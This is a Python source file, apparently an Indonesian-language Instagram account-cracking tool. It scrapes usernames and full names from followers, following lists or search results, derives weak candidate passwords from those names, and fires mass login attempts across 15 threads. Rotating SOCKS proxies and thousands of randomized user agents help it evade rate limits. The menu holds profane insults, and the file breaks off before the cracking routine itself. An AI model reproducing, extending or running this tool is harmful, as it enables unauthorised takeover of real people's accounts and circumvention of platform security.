# coding:utf-8
#/usr/bin/python
try:
    import json
    import uuid
    import hmac
    import random
    import hashlib
    import urllib
    import stdiomask
    import urllib.request
    import calendar
    import requests
except ImportError as e:
    exit(f'\n [\033[1;35m>\033[0m] module {e} belum terinstall')
    
###----------[ IMPORT MODULE AND INGredIENT ]---------- ###
import rich
from rich.markdown import Markdown
import os, sys, subprocess, platform
import os
try:
    import requests
except ImportError:
    print('\n [×] Modul requests belum terinstall!...\n')
    os.system('pip install requests')

try:
    import concurrent.futures
except ImportError:
    print('\n [×] Modul Futures belum terinstall!...\n')
    os.system('pip install futures')

try:
    import bs4
except ImportError:
    print('\n [×] Modul Bs4 belum terinstall!...\n')
    os.system('pip install bs4')

try:
	import stdiomask
except ImportError:
	catet_mask = ('# • sedang menginstall modul stdiomask •')
	mask = rich.markdown.Markdown(catet_mask, style='green')
	rich.console.Console().print(mask)
	os.system('pip install stdiomask')
	
bff_2 = open(os.devnull, "w")
my_music = subprocess.call(["dpkg","-s","play-audio"],stdout=bff_2,stderr=subprocess.STDOUT)
bff_2.close()
if my_music !=0:
	catet_play = ('# • sedang menginstall play-audio •')
	play = rich.markdown.Markdown(catet_play, style='green')
	rich.console.Console().print(play)
	os.system('pkg install play-audio')
import requests,bs4,json,os,sys,random,datetime,time,re
try:
    import rich
except ImportError:
    os.system('pip install rich')
    time.sleep(1)
    try:
        import rich
    except ImportError:
        exit('Tidak Dapat Menginstall Module rich, Coba Install Manual (pip install rich)')
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from time import sleep
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime
from bs4 import BeautifulSoup as parser
from rich import print as asep
import time
###----------[ IMPORT RICH AND INGredIENT ]---------- ###
from rich.panel import Panel
from rich.tree import Tree
from rich import print as prints
from rich import print as printer
from rich.console import Console
from rich.console import Console as sol
from rich.table import Table
from rich.columns import Columns
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn,TimeElapsedColumn
console = Console()
day=datetime.now().strftime("%d-%b-%Y")
ttl=datetime.now().strftime("%d %b %Y")
nyMnD = 5
nyMxD = 10
current_GMT = time.gmtime(time.time())
insta_log='https://www.instagram.com/accounts/login/?force_classic_login=&'
url='https://www.instagram.com'
menudump=[]
def folder():
	try:os.mkdir('data')
	except:pass
	try:os.mkdir('result')
	except:pass
	
    
try:
    prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
    open('.prox.txt','w').write(prox)
except Exception as e:
    print('GAGAL')
    
prox=open('.prox.txt','r').read().splitlines()
try:
	os.system('curl https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks5.txt -o socks5.txt')
except:
	pass
sock=open('socks5.txt','r').read().splitlines()
CY='\033[96;1m'
H='\033[1;32m' #HIJAU
M='\033[1;31m' #MERAH
K='\033[1;33m' #KUNING
U='\033[1;35m' #UNGU
O='\033[38;2;255;127;0;1m' #ORANGE
C='\033[0m' #CLEAR
N = '\x1b[0m' # WARNA MATI
USN="Mozilla/5.0 (Linux; Android 8.1.0; Nexus 5X Build/OPM3.171019.013; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 Instagram 37.0.0.21.97 Android (27/8.1.0; 420dpi; 1080x1794; LGE/google; Nexus 5X; bullhead; bullhead; ru_UA; 98288242)"
# USN=""Mozilla/5.0 (Linux; Android 12; SM-G991B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36 Instagram 215.0.0.27.359 Android (31/12; 540dpi; 1080x2158; samsung; SM-G991B; o1s; exynos2100; fr_FR; 337202359)"
#ugen=open('ua.txt','r').read().splitlines()
internal,external,success,checkpoint,loop,following,lisensikuni,lisensiku=[],[],[],[],0,[],[],['sukses']
method=[]
ugen=[]
ugen3=[]
ugen2=[]
s=requests.Session()
baru=[]
zx=[]
############UA#############
for tu in range(10000):
	a2 = random.choice([
            'RMX2040',
            'RMX2001',
            'RMX1827',
            'RMX2185',
            'RMX2030',
            'RMX3201',
            'RMX2195',
            'RMX2027'])
	a = ''.join((random.choice('ABCDEFGHIJKLM1234567890NOPQRSTUVWXYS')) for _ in range(6))
	a1=''.join((random.choice('ABCDEFGHIJKLMN1234567890OPQRSTUVWXYZ')) for _ in range(6))
	b = random.randrange(73, 99)
	c = random.randrange(4200, 4900)
	d = random.randrange(40, 150)
	e = random.randrange(4,10)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g=random.randrange(1, 999)
	h=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	user = f'''Mozilla/5.0 (Linux; Android 4.4.2; Sony Xperia Z3 Build/{a}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{b}.0.{c}.{d} Mobile Safari/537.36'''
	user1 = f'''Mozilla/5.0 (Linux; Android {e}; XIAOMI Redmi Note 9 Pro Build/{a}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{b}.0.{c}.{d} Mobile Safari/537.36'''
	user2 = f'''Mozilla/5.0 (Linux; Android {e}; HTC One M9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{b}.0.{c}.{d} Mobile Safari/537.36'''
	useragent = f'''Mozilla/5.0 (Linux; Android 5.1; Infinix-X552 Build/{a}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{b}.0.{c}.{d} Mobile Safari/537.36'''
	xiomi = f'''Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/{a1}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{b}.0.{c}.{d} Mobile Safari/537.36'''
	useragen = f'''Mozilla/5.0 (Linux; U; Android 10; {a2} Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{b}.0.{c}.{d} Mobile Safari/537.36'''
	useragents = f'''Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/{a1}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{b}.0.{c}.{d} Mobile Safari/537.36'''
	uacak=random.choice([user,user1,user2,useragent,xiomi,useragen,useragents])
	baru.append(useragents)
ugen5=[]
for xd in range(1000):
    build_nokiax = ['JDQ39','JZO54K']
    rr = random.randint; rc = random.choice
    miui_v3 = ['-g','-gn','-go','-gn','gzip(gfe)',' swan-mibrowser']
    miui_v1 = ['0','1','2','3','4','5','6','7','8','9','10','11','12']
    miui_v2 = ['0','1','2','3','4','5','6','7','8','9','10','11','14','22','27','36']
    aZ = ['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']
    basa = ['en-us','en-gb','id-id','de-de','ru-ru','en-sg','fr-fr','fa-ir','ja-jp','pt-br','cs-cz','zh-hk','zh-cn','vi-vn','en-ph','en-in','tr-tr']
    gt = ['GT-1015','GT-1020','GT-1030','GT-1035','GT-1040','GT-1045','GT-1050','GT-1240','GT-1440','GT-1450','GT-18190','GT-18262','GT-19060I','GT-19082','GT-19083','GT-19105','GT-19152','GT-19192','GT-19300','GT-19505','GT-2000','GT-20000','GT-200s','GT-3000','GT-414XOP','GT-6918','GT-7010','GT-7020','GT-7030','GT-7040','GT-7050','GT-7100','GT-7105','GT-7110','GT-7205','GT-7210','GT-7240R','GT-7245','GT-7303','GT-7310','GT-7320','GT-7325','GT-7326','GT-7340','GT-7405','GT-7550	5GT-8005','GT-8010','GT-81','GT-810','GT-8105','GT-8110','GT-8220S','GT-8410','GT-9300','GT-9320','GT-93G','GT-A7100','GT-A9500','GT-ANDROID','GT-B2710','GT-B5330','GT-B5330B','GT-B5330L','GT-B5330ZKAINU','GT-B5510','GT-B5512','GT-B5722','GT-B7510','GT-B7722','GT-B7810','GT-B9150','GT-B9388','GT-C3010','GT-C3262','GT-C3310R','GT-C3312','GT-C3312R','GT-C3313T','GT-C3322','GT-C3322i','GT-C3520','GT-C3520I','GT-C3592','GT-C3595','GT-C3782','GT-C6712','GT-E1282T','GT-E1500','GT-E2200','GT-E2202','GT-E2250','GT-E2252','GT-E2600','GT-E2652W','GT-E3210','GT-E3309','GT-E3309I','GT-E3309T','GT-G530H','GT-g900f','GT-G930F','GT-H9500','GT-I5508','GT-I5801','GT-I6410','GT-I8150','GT-I8160OKLTPA','GT-I8160ZWLTTT','GT-I8258','GT-I8262D','GT-I8268','GT-I8505','GT-I8530BAABTU','GT-I8530BALCHO','GT-I8530BALTTT','GT-I8550E','GT-i8700','GT-I8750','GT-I900','GT-I9008L','GT-i9040','GT-I9080E','GT-I9082C','GT-I9082EWAINU','GT-I9082i','GT-I9100G','GT-I9100LKLCHT','GT-I9100M','GT-I9100P','GT-I9100T','GT-I9105UANDBT','GT-I9128E','GT-I9128I','GT-I9128V','GT-I9158P','GT-I9158V','GT-I9168I','GT-I9192I','GT-I9195H','GT-I9195L','GT-I9250','GT-I9303I','GT-I9305N','GT-I9308I','GT-I9505G','GT-I9505X','GT-I9507V','GT-I9600','GT-m190','GT-M5650','GT-mini','GT-N5000S','GT-N5100','GT-N5105','GT-N5110','GT-N5120','GT-N7000B','GT-N7005','GT-N7100T','GT-N7102','GT-N7105','GT-N7105T','GT-N7108','GT-N7108D','GT-N8000','GT-N8005','GT-N8010','GT-N8020','GT-N9000','GT-N9505','GT-P1000CWAXSA','GT-P1000M','GT-P1000T','GT-P1010','GT-P3100B','GT-P3105','GT-P3108','GT-P3110','GT-P5100','GT-P5200','GT-P5210XD1','GT-P5220','GT-P6200','GT-P6200L','GT-P6201','GT-P6210','GT-P6211','GT-P6800','GT-P7100','GT-P7300','GT-P7300B','GT-P7310','GT-P7320','GT-P7500D','GT-P7500M','GT-P7500R','GT-P7500V','GT-P7501','GT-P7511','GT-S3330','GT-S3332','GT-S3333','GT-S3370','GT-S3518','GT-S3570','GT-S3600i','GT-S3650','GT-S3653W','GT-S3770K','GT-S3770M','GT-S3800W','GT-S3802','GT-S3850','GT-S5220','GT-S5220R','GT-S5222','GT-S5230','GT-S5230W','GT-S5233T','GT-s5233w','GT-S5250','GT-S5253','GT-s5260','GT-S5280','GT-S5282','GT-S5283B','GT-S5292','GT-S5300','GT-S5300L','GT-S5301','GT-S5301B','GT-S5301L','GT-S5302','GT-S5302B','GT-S5303','GT-S5303B','GT-S5310','GT-S5310B','GT-S5310C','GT-S5310E','GT-S5310G','GT-S5310I','GT-S5310L','GT-S5310M','GT-S5310N','GT-S5312','GT-S5312B','GT-S5312C','GT-S5312L','GT-S5330','GT-S5360','GT-S5360B','GT-S5360L','GT-S5360T','GT-S5363','GT-S5367','GT-S5369','GT-S5380','GT-S5380D','GT-S5500','GT-S5560','GT-S5560i','GT-S5570B','GT-S5570I','GT-S5570L','GT-S5578','GT-S5600','GT-S5603','GT-S5610','GT-S5610K','GT-S5611','GT-S5620','GT-S5670','GT-S5670B','GT-S5670HKBZTA','GT-S5690','GT-S5690R','GT-S5830','GT-S5830D','GT-S5830G','GT-S5830i','GT-S5830L','GT-S5830M','GT-S5830T','GT-S5830V','GT-S5831i','GT-S5838','GT-S5839i','GT-S6010','GT-S6010BBABTU','GT-S6012','GT-S6012B','GT-S6102','GT-S6102B','GT-S6293T','GT-S6310B','GT-S6310ZWAMID','GT-S6312','GT-S6313T','GT-S6352','GT-S6500','GT-S6500D','GT-S6500L','GT-S6790','GT-S6790L','GT-S6790N','GT-S6792L','GT-S6800','GT-S6800HKAXFA','GT-S6802','GT-S6810','GT-S6810B','GT-S6810E','GT-S6810L','GT-S6810M','GT-S6810MBASER','GT-S6810P','GT-S6812','GT-S6812B','GT-S6812C','GT-S6812i','GT-S6818','GT-S6818V','GT-S7230E','GT-S7233E','GT-S7250D','GT-S7262','GT-S7270','GT-S7270L','GT-S7272','GT-S7272C','GT-S7273T','GT-S7278','GT-S7278U','GT-S7390','GT-S7390G','GT-S7390L','GT-S7392','GT-S7392L','GT-S7500','GT-S7500ABABTU','GT-S7500ABADBT','GT-S7500ABTTLP','GT-S7500CWADBT','GT-S7500L','GT-S7500T','GT-S7560','GT-S7560M','GT-S7562','GT-S7562C','GT-S7562i','GT-S7562L','GT-S7566','GT-S7568','GT-S7568I','GT-S7572','GT-S7580E','GT-S7583T','GT-S758X','GT-S7592','GT-S7710','GT-S7710L','GT-S7898','GT-S7898I','GT-S8500','GT-S8530','GT-S8600','GT-STB919','GT-T140','GT-T150','GT-V8a','GT-V8i','GT-VC818','GT-VM919S','GT-W131','GT-W153','GT-X831','GT-X853','GT-X870','GT-X890','GT-Y8750']
    ugent1 = f"Mozilla/5.0 (Linux; Android {str(rr(4,12))}; {str(rc(gt))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(100,104))}.0.{str(rr(3900,4900))}.{str(rr(40,150))} Mobile Safari/537.36 {str(rc(aZ))}{str(rr(1,1000))}"
    ugent2 = f"Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/{str(rc(build_nokiax))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(100,104))}.0.{str(rr(3900,4900))}.{str(rr(40,150))} Mobile Safari/537.36 NokiaBrowser/7.{str(rr(1,5))}.1.{str(rr(16,37))} {str(rc(aZ))}{str(rr(1,1000))}"
    ugent3 = f"Mozilla/5.0 (Linux; U; Android {str(rr(4,12))}; {str(rc(basa))}; Redmi 5 Plus Build/N2G47H) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(40,104))}.0.{str(rr(3900,4900))}.{str(rr(40,150))} Mobile Safari/537.36 XiaoMi/MiuiBrowser/{str(rr(1,99))}.{str(rc(miui_v1))}.{str(rc(miui_v2))}{str(rc(miui_v3))} {str(rc(aZ))}{str(rr(1,1000))}"
    memekk = random.choice([ugent1, ugent2, ugent3])
    ugen5.append(memekk)
ugennce=[]
for xjjd in range(1000):
    rr = random.randint
    rc = random.choice
    az = ['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']
    uancek = str(rc([f"Mozilla/5.0 (Linux; U; Android {str(rr(4,12))}; en-us; OPPO A{str(rr(30,57))} Build/{str(rc(az))}{str(rc(az))}{str(rc(az))}{str(rr(11,99))}{str(rc(az))}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(20,100))}.0.{str(rr(1111,9999))}.80 Mobile Safari/537.36 {str(rc(['S40OviBrowser','HeyTapBrowser']))}/{str(rr(2,40))}.7.36.1",f"Mozilla/5.0 (Linux; U; Android {str(rr(5,12))}; en-us; GM{str(rr(1111,9999))} Build/{str(rc(az))}{str(rc(az))}{str(rc(az))}{str(rr(1,10))}.{str(rr(111111,999999))}.003)AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(10,100))}.0.{str(rr(1111,9999))}.80 Mobile Safari/537.36 SamsungBrowser/{str(rr(2,45))}.7.0.0"]))
    ugennce.append(uancek)
for najaja in range(1000):
    rr = random.randint
    rc = random.choice
    uacrack1 = f"Mozilla/5.0 (Linux; Android {str(rr(7,12))}; RMX2101 Build/RKQ1.{str(rr(111111,211111))}.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,150))}.0.{str(rr(5500,5900))}.{str(rr(75,99))} Mobile Safari/537.36"
    uacrack2 = f"Mozilla/5.0 (Linux; Android 11; Infinix X6512 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(75,150))}.0.{str(rr(5000,5500))}.{str(rr(75,99))} Mobile Safari/537.36"
    uacrack3 = f"Mozilla/5.0 (Linux; Android {str(rr(9,13))}; LG-H918 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.{str(rr(3200,3500))}.84 Mobile Safari/537.36"
    uacrack4 = f"Mozilla/5.0 (iPhone; CPU iPhone OS {str(rr(9,16))}_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1 Mobile/15E148 Safari/604.1"
    uacrack5 = f"Mozilla/5.0 (Linux; Android {str(rr(7,12))}; Redmi Note 9 Pro Max) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,99))}.0.{str(rr(4500,5900))}.{str(rr(75,150))} Mobile Safari/537.36"
    uacrack6 = f"Mozilla/5.0 (Linux; U; Android {str(rr(7,12))}; en-US; LEGEND MAX Build/RP1A.{str(rr(111111,210000))}.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,99))}.0.{str(rr(3500,4000))}.{str(rr(75,150))} UCBrowser/{str(rr(10,20))}.4.0.{str(rr(1300,1500))} Mobile Safari/537.36"
    uacrack7 = f"Mozilla/5.0 (Linux; Android 12; CPH2127) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(75,99))}.0.{str(rr(4500,4900))}.{str(rr(75,99))} Mobile Safari/537.36"
    uanyancek= random.choice([uacrack1, uacrack2, uacrack3, uacrack4, uacrack5, uacrack6, uacrack7])
    ugen.append(uanyancek)
hapus  = '[/]'
biru_m = '[bold cyan]'
# CLEAR
def clear():
    os.system('clear')
 
###----------[ GET TIME ]---------- ###
def waktu():
	now = datetime.now()
	hours = now.hour
	if 4 <= hours < 12:timenow = "Selamat pagi"
	elif 12 <= hours < 15:timenow = "Selamat siang"
	elif 15 <= hours < 18:timenow = "Selamat malam"
	else:timenow = "Selamat malam"
	return timenow

def jalan(keliling):
	for mau in keliling + '\n':
		sys.stdout.write(mau)
		sys.stdout.flush();sleep(0.03) 
		
###----------[ LOGO ]---------- ###
def banner():
    os.system('clear')
    cetak(nel(f"""[white] \t[green1]<  8u11 4n0nym0u5 >
 ----------------
    \
     \
                                   .::!!!!!!!:.
  .!!!!!:.                        .:!!!!!!!!!!!!
  ~~~~!!!!!!.                 .:!!!!!!!!!UWWW$$$
      :$$NWX!!:           .:!!!!!!XUWW$$$$$$$$$P
      $$$$$##WX!:      .<!!!!UW$$$$  $$$$$$$$#
      $$$$$  $$$UX   :!!UW$$$$$$$$$   4$$$$$*
      ^$$$B  $$$$\     $$$$$$$$$$$$   d$$R
        *$bd$$$$      *$$$$$$$$$$$o+
         [white] Author by: LukmanXD
""",style='#808000',title='[white] Lukman'))

try:
    # python 2
    urllib_quote_plus = urllib.quote
except:
    # python 3
    urllib_quote_plus = urllib.parse.quote_plus
 


def cekAPI(cookie):
    user=open('.username','r').read()
    try:
        c=s.get("https://i.instagram.com/api/v1/users/web_profile_info/?username=%s"%(user),cookies={'cookie':coki},headers={"user-agent":USN,"x-ig-app-id":'936619743392459'})
        i=c.json()["data"]["user"]
        nama=i["full_name"]
        followers=i["edge_followed_by"]["count"]
        following=i["edge_follow"]["count"]
        external.append(f'{nama}|{followers}|{following}')
    except  (ValueError,KeyError):
        cetak(nel(f"""[white][[green]•[white]] Akun Instagram Terkena Checkpoint"""))
        time.sleep(4)
        os.remove('.kukis.log')
        os.remove('.username')
        exit()

    return external,user

def login_kamu():
    if "sukses" in lisensiku:
        try:
            kuki=open('.kukis.log','r').read()
        except FileNotFoundError:
            banner()
            cetak(nel(f"""[white][[green]1[white]] Login Menggunakan Cookie""",style="#808000",title='[white]Login Dulu Anjing Anak Haram Lu'))
            loginpil=input(f"  [\033[31m•\033[0m] Chouse :{C} ")
            if loginpil=='1':
                cetak(nel(f""" [white]Gunakan username dan cookies instagram untuk login. sebelum login pastikan akun bersifat publik bukan privat""",style="#808000"))
                us=input(f'  [\033[31m•\033[0m] Username :{C}')
                cok=input(f'  [\033[31m•\033[0m] Cookie :{C}')
                kuki=open('.kukis.log','w').write(cok)
                user=open('.username','w').write(us)
                asep(Panel.fit("[white][[green]•[white]] Login Sucsesfully Silahkan Run Kembali"))
                sleep(2.3)
                exit()
            elif loginpil == '2':
                cetak(nel(f"""[white][[green]•[white] Sedang Dalam Perbaikan""",style="#808000"));exit()
        ex,user=cekAPI(kuki)
        cookie={'cookie':kuki}
        instagram(ex,user,cookie).menu()
    else:
        login()
def login():
    global external
    try:
        print('\n[•] Gunakan username dan password instagram untuk login. sebelum login pastikan akun bersifat publik bukan privat')
        us=input(f"[•] Username: {C}")
        pw=stdiomask.getpass(prompt=f'[•] Password: {C}')
    except KeyboardInterrupt:
        wel = '# KeyboardInterrupt terdeteksi... keluar !'
        wel2 = mark(wel, style='green')
        sol().print(wel2)
        exit()
    x=instagramAPI(us,pw).loginAPI()
    if x.get('status')=='success':
        open('.username','a').write(us)
        open('.kukis.log','a').write(x.get('cookie'))
        cookie={'cookie':x.get('cookie')}
        print(f'\n{H}>{C} Login berhasil')
        login_kamu()
    elif x.get('status')=='checkpoint':
        wel = '# Login checkpoint'
        wel2 = mark(wel, style='green')
        sol().print(wel2)
        login()
    else:
        wel = '# Username atau password yang anda masukan salah'
        wel2 = mark(wel, style='green')
        sol().print(wel2)
        login()


class instagram:
    def __init__(self,external,username,cookie):
        self.ext=external
        self.username=username
        self.cookie=cookie
        self.s=requests.Session()
    def logo(self):
        for i in external:
            try:
                nama=i.split('|')[0]
                followers=i.split('|')[1]
                following=i.split('|')[2]
            except:
                pass
            banner()
            cetak(nel(f"""[white][[green]•[white]] Username  : {self.username}\n[white][[green]•[white]] Followers : {followers} • {following}\n[white][[green]•[white]] Bergabung : {ttl}""",style='#808000',title="[white]%s[white]"%(nama)))
            cetak(nel(f"""[white][[green]1[white]] Crack Dari Pencarian     [[green]2[white]] Crack Dari Pengikut    
[[green]3[white]] Crack Dari Mengikuti     [[green]4[white]] Ontap Checkpoin Joss [new]
[[green]5[white]] Lihat Hasil Crack        [[green]6[white]] Bot Auto Unfollow
[[green]7[white]] Laporkan Bug             [[green]8[white]] logout""",style="#808000"))
            


    def BUG(self):
        cetak(nel(f"""[white][[green]•[white]] Masukan Pesan Untuk Di Kirim Ke Admin"""))
        i=input('  [\033[31m•\033[0m] Pesan : ')
        print('  [\033[31m•\033[0m] Pesan Anda : \033[32m%s \033[0mAkan Segera Terkirim Mohon Tunggu....'%(i));time.sleep(2)
        os.system('xdg-open https://wa.me/6285794270820?text=%s'%(i))
        exit()

    def ChangeLog(self):
        io='[1] Fix bug login instagram\n[2] Ganti tampilan scripts\n[3] Fix bug lisensi invalid'
        oi = nel(io, style='magenta')
        cetak(nel(oi, title='Fitur yang di update'))

        io='[1] Bot unfollow instagram\n[2] Bot spam komen'
        oi = nel(io, style='cyan')
        cetak(nel(oi, title='Fitur tambahan'))

        io='[1] Untuk fitur brute force masih dalam perbaikan\n[2] Untuk fitur Bot unfollow masih dalam perbaikan\n[3] Untuk fitur bot komen masih dalam perbaikan'
        oi = nel(io, style='magenta')
        cetak(nel(oi, title='Fix Bug'))
        exit()

    def Exit(self):
        x=input(f'  [\033[31m•\033[0m] Apakah anda ingin keluar y/t > ')
        if x in ('y','Y'):
            os.remove('.kukis.log')
            os.remove('.username')
            login_kamu()
        elif x in ('t','T'):
            login_kamu()
        else:
            self.Exit()

    def sixAPI(self,six_id):
        url = "https://www.instagram.com/web/search/topsearch/?context=blended&query="+six_id+"&rank_token=0.3953592318270893&count=1"
        x = requests.get(url)
        x_jason = x.json()
        uid = str( x_jason['users'][0].get("user").get("pk") )
        return uid

    def unfollowAPI(self,user_id,username_id,cookie):
        uuid=generateUUID(True)
        xx=self.s.get("https://www.instagram.com/",headers={"user-agent":USN}).content
        crf_token = re.findall('{"config":{"csrf_token":"(.*)","viewer"',str(xx))[0]
        s.headers.update({'Connection': 'close',
                       'Accept': '*/*',
                       'Content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                       'Cookie2': '$Version=1',
                       'Accept-Language': 'en-US',
                       'User-Agent': USN})

        data = json.dumps({'_uuid': uuid,
                           '_uid': username_id,
                           'user_id': user_id,
                           '_csrftoken': crf_token})

        self.payload = 'signed_body={}.{}&ig_sig_key_version=4'.format(
            self.generateUUID(False),
            urllib.request.quote(data))
        return s.post('https://i.instagram.com/api/v1/friendships/destroy/%s/'%(user_id),self.payload,cookies=cookie).text


    def searchAPI(self,cookie,nama):
        try:
            x=s.get('https://www.instagram.com/web/search/topsearch/?count=100000&context=blended&query=%s&rank_token=0.21663777590422106&include_reel=true'%(nama),cookies=cookie,headers={"user-agent":USN})
            x_jason=json.loads(x.text)
            for i in x_jason['users']:
                user=i['user']
                username=user['username']
                fullname=user['full_name']
                internal.append(f'{username}|{fullname}')
        except requests.exceptions.ConnectionError:
            exit(f'  [{M}!{C}] Koneksi internet bermasalah')
        return internal

    def idAPI(self,cookie,id):
        if 'sukses' in lisensiku:
            try:
                m=s.get("https://i.instagram.com/api/v1/users/web_profile_info/?username=%s"%(id),cookies=cookie,headers={"user-agent":USN,"x-ig-app-id":'936619743392459'})
                m_jason=m.json()["data"]["user"]
                idx=m_jason["id"]
            except requests.exceptions.ConnectionError:
                exit(f"  [\033[31m•\033[0m] Koneksi internet bermasalah{C}")
            except Exception as e:
                exit(f"  [\033[31m•\033[0m] Username yang anda masukan tidak di temukan pastikan target bersifat publik{C}")
            return idx
        else:lisensi()

    def infoAPI(self,cookie,api,id):
        if 'sukses' in  lisensiku:
            try:
                cetak(nel(f"""[white][[green]•[white]] Tunggu Sedang Mengumpulkan User""",style="#808000"))
                x=s.get(api%(id),cookies=cookie,headers={"user-agent":USN})
                x_jason=json.loads(x.text)
                for i in x_jason['users']:
                    username = i["username"]
                    nama = i["full_name"]
                    internal.append(f'{username}|{nama}')
                    following.append(username)
                if 'pengikut' in menudump:
                    maxid=x_jason['next_max_id']
                    for z in range (9999):
                        x=s.get('https://i.instagram.com/api/v1/friendships/'+id+'/followers/?count=100&max_id='+maxid,cookies=cookie,headers={"user-agent":USN})
                        x_jason=json.loads(x.text)
                        try:
                            for i in x_jason['users']:
                                username = i["username"]
                                nama = i["full_name"]
                                internal.append(f'{username}|{nama}')
                                following.append(username)
                            try:
                                 maxid=x_jason['next_max_id']
                            except:
                                break
                        except:
                            if 'challenge' in x.text:
                                break
                            else:
                                continue
                else:pass
            except requests.exceptions.ConnectionError:
                exit(f'  [\033[31m•\033[0m] Koneksi internet bermasalah{C}')
            except Exception as e:
                print(f'  [\033[31m•\033[0m] Username yang anda masukan tidak di temukan{C}')
            return internal
        else:lisensi()

    def passwordAPI(self,xnx):
        print('  [\033[31m•\033[0m] Total User : %s'%(len(internal)))
        cetak(nel(f"""[white][[green]1[white]] FirstName123 Firstname1234\n[[green]2[white]] FirtsName123 Firstname1234 Firstname12345 FullName\n[[green]3[white]] FirstName+123,FullName,Full Name\n[[green]4[white]] Password Manual""",style="#808000"))
        c=input(f'  [\033[31m•\033[0m] Password : ')
        if c=='1':
            self.generateAPI(xnx,c)
        elif c=='2':
            self.generateAPI(xnx,c)
        elif c=='3':
            self.generateAPI(xnx,c)
        elif c=='7':
            self.generateAPI(xnx,c)
        elif c=='4':
            ui='# PASSWORD MANUAL'
            uu=mark(ui,style='')
            sol().print(uu)
            print(f'{M}  Contoh sayang,anjing,bangsat')
            print('')
            zx=input(f'  [\033[31m•\033[0m] List password :{C} ')
            self.generateAPI(xnx,c,zx)
        else:
            self.passwordAPI(xnx)

    def generateAPI(self,user,o,zx=''):
        global prog,des
        prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
        des = prog.add_task('',total=len(internal))
        cetak(nel(f"""[white][[green]•[white]] Hasil OK disimpan ke: result/{day}.txt\n[white][[green]•[white]] Hasil CP disimpan ke: result/{day}.txt""",style="#808000",subtitle='[white]Jika alamat IP di-spam, aktifkan mode pesawat selama 10 detik'));print('')
        with prog:
            with ThreadPoolExecutor(max_workers=15) as shinkai:
                for i in user:
                    try:
                        username=i.split("|")[0]
                        password=i.split("|")[1].lower()
                        for w in password.split(" "):
                            if len(w)<3:
                                continue
                            else:
                                w=w.lower()
                            if o=="1":
                                if len(w)==3 or len(w)==4 or len(w)==5:
                                    sandi=[w+'123',w+'1234']
                                else:
                                    sandi=[w]
                            elif o=="2":
                                if len(w)==3 or len(w)==4 or len(w)==5:
                                    sandi=[w+'123',w,w+'1234',w+'12345']
                                else:
                                    sandi=[w+'123',w,w+'1234',w+'12345']
                            elif o=="3":
                                if len(w)==3 or len(w)==4 or len(w)==5:
                                    sandi=[w+'123',w,password.lower()]
                                else:
                                    sandi=[w+'123',w,password.lower()]
                            elif o=="7":
                                if len(w)==3 or len(w)==4 or len(w)==5:
                                    sandi=[w+'123',w+'1234',w+'12345',w]
                                else:
                                    sandi=[w+'123',w+'1234',w+'12345',password.lower()]
                            elif o=="4":
                                if len(zx) > 3:
                                    sandi = zx.replace(" ", "").split(",")
                                else:
                                    break
                            shinkai.submit(self.crackAPI,username,sandi)
                    except:
                        pass
        print('  [\033[31m•\033[0m] Crack Selesai Tod.......')
        exit()

    def APIinfo(self,user):
        try:
